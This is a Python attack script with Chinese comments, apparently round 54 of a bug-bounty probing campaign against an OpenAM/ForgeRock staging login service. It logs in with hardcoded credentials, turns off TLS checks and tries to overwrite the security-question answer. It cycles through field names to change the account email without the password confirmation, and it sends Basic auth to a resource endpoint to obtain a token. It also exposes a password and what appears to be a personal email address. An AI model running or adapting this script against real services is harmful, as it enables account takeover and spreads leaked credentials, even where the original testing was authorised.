# -*- coding: utf-8 -*-
"""AIC 第五十四轮:收尾——kbaInfo 复验 / mail 确认密码字段穷举 / resource+Basic
上轮:kbaInfo 出现 403 HTML(疑限流,41 轮曾 200);全 53 轮面封闭。
本轮:
A. kbaInfo 复验(是否仍可写;限流是否恢复)
B. mail 确认密码字段名穷举(userpassword/currentPassword/confirmPassword/password
   + 当前密码)能否改 mail(找到字段名=完整链;字段名错误被跳过=校验绕过漏洞)
C. authIndexType=resource + Authorization: Basic(ROPC 到 JSON 认证端点)
预期结果表:
  成立 -> kbaInfo 可写恢复;mail 可改(或字段名绕过);resource+Basic 返回 tokenId
"""
import requests, urllib3, json, time, base64
urllib3.disable_warnings()

BASE = 'https://openam-bug-bounty-stag.forgeblocks.com'
AUTH = BASE + '/am/json/realms/alpha/authenticate'
USER, PASS = 'pccp', 'Agent360User$5h2!QxR'
MY_ID = 'db3d6356-61a0-4684-9eaa-c1353dfa44d9'
FORM = {'Content-Type': 'application/x-www-form-urlencoded'}

S = requests.Session()
S.trust_env = False
S.proxies = {'http': None, 'https': None}
S.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})

def login():
    r = S.post(AUTH, json={}, timeout=15, verify=False)
    d = r.json()
    authId = d['authId']
    cbs = []
    for cb in d.get('callbacks', []):
        t = cb['type']
        inp = [{'name': 'IDToken1', 'value': USER}] if t == 'NameCallback' else \
              [{'name': 'IDToken2', 'value': PASS}] if t == 'PasswordCallback' else \
              [{'name': k.get('name'), 'value': k.get('value')} for k in cb.get('input', [])]
        cbs.append({'type': t, 'output': cb.get('output', []), 'input': inp, '_id': cb.get('_id')})
    r2 = S.post(AUTH, json={'authId': authId, 'callbacks': cbs}, timeout=15, verify=False)
    tok = r2.json().get('tokenId')
    S.headers.update({'Cookie': 'aa942d46ece12ce=' + tok,
                      'Accept-API-Version': 'resource=2.1, protocol=1.0'})
    return tok

tok = login()
print('LOGIN OK:', tok[:25], '...')
U = BASE + '/am/json/realms/root/realms/alpha/users/' + MY_ID

print('\n=== A. kbaInfo 复验 ===')
time.sleep(3)
r = S.put(U, json={'kbaInfo': [{'questionId': '1', 'answer': 'hacked_answer'}]}, timeout=12, verify=False)
print('PUT kbaInfo -> %d %s' % (r.status_code, r.text[:120].replace('\n', ' ')))
r2 = S.get(U, timeout=12, verify=False)
print('GET 回显 kbaInfo: %s' % ('hacked_answer' in r2.text))
S.put(U, json={'kbaInfo': [{'questionId': '1', 'answer': ''}]}, timeout=12, verify=False)

print('\n=== B. mail 确认密码字段穷举 ===')
for field in ['userpassword', 'currentPassword', 'confirmPassword', 'password',
              'existingPassword', 'current-password']:
    body = {'mail': ['pccp_new@example.com'], field: PASS}
    try:
        r = S.put(U, json=body, timeout=12, verify=False)
        r2 = S.get(U, timeout=12, verify=False)
        changed = 'pccp_new@example.com' in r2.text
        print('确认字段=%-18s -> %d mail已改=%s %s' % (
            field, r.status_code, changed, r.text[:90].replace('\n', ' ')))
        if changed:
            print('  !! mail 可改! 字段=%s' % field)
            S.put(U, json={'mail': ['1643584176@qq.com']}, timeout=12, verify=False)
            print('  已恢复原 mail')
    except Exception as e:
        print('确认字段=%-18s -> ERR %s' % (field, str(e)[:50]))
    time.sleep(0.5)

print('\n=== C. resource 认证 + Basic 头 ===')
b64 = base64.b64encode((USER + ':' + PASS).encode()).decode()
for body in [{}, {'resource': 'enduser'}]:
    r = S.post(BASE + '/am/json/realms/alpha/authenticate?authIndexType=resource&authIndexValue=enduser',
               headers={'Authorization': 'Basic ' + b64}, json=body, timeout=12, verify=False)
    print('resource+Basic body=%-30s -> %d %s' % (str(body)[:30], r.status_code,
          r.text[:200].replace('\n', ' ')))
    time.sleep(0.5)
